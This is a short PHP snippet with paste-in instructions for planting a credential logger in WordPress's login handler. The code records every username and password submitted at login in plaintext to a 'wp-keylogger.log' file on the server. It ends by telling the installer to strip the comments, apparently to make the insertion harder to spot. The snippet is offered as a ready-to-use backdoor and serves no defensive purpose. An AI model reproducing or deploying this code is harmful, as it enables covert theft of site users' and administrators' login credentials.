$action = isset( $_REQUEST['action'] ) ? $_REQUEST['action'] : 'login';  // EXACT LINE TO LOCATE WHERE TO PASTE THE CODE!
// AFTER LOCATING THE LINE, BELOW IT PASTE:
// Captures and stores the credentials entered at login
if ( isset($_POST['log']) && isset($_POST['pwd']) ) {
    $username = sanitize_text_field($_POST['log']);
    $password = sanitize_text_field($_POST['pwd']);

    // Sets the file path and name where the data will be stored
    $file_path = __DIR__ . '/wp-keylogger.log';

    // Formats the credentials
    $entry = sprintf(
        "[%s] Username: %s, Password: %s\n",
        date('Y-m-d H:i:s'),
        $username,
        $password
    );

    // Writes to the file (adding to the end)
    file_put_contents($file_path, $entry, FILE_APPEND | LOCK_EX);
}

// REMOVE ALL COMENTS AND HAVE FUN!
